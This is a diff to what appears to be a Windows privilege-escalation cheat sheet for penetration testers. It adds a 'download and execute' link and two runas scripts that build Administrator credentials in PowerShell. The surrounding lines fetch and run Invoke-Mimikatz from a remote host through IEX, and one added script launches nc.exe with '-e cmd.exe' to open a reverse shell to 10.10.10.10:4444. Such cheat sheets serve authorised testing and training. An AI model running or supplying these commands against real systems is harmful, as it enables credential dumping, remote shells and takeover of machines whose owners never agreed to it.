@@ -163,6 +163,10 @@ powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadStri
 powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1');"
 ```
 
+## Download & Execute
+
+* https://github.com/740i/pentest-notes/blob/master/filetransfers.md#download-and-execute
+
 ## Kernel
 
 * `systeminfo`
@@ -410,10 +414,20 @@ cmd> powershell Start-Process cmd.exe -Credential (New-Object System.Management.
 cmd> powershell -command "start-process cmd.exe -argumentlist '/c calc' -Credential (New-Object System.Management.Automation.PSCredential 'username',(ConvertTo-SecureString 'password' -AsPlainText -Force))"
 ```
 
-* Script runas.ps1:
+* Runas script 1:
 ```
-$username = 'user'
-$password = 'password'
+$username = "Administrator"
+$password = "<PASSWORD>"
+$secstr = New-Object -TypeName System.Security.SecureString
+$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
+$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
+Invoke-Command -Credential $cred -Computer localhost -ScriptBlock {whoami}
+```
+
+* Runas Script 2:
+```
+$username = 'Administrator'
+$password = '<PASSWORD>'
 $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
 $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
 Start-Process nc.exe -ArgumentList '-e cmd.exe 10.10.10.10 4444' -Credential $credential
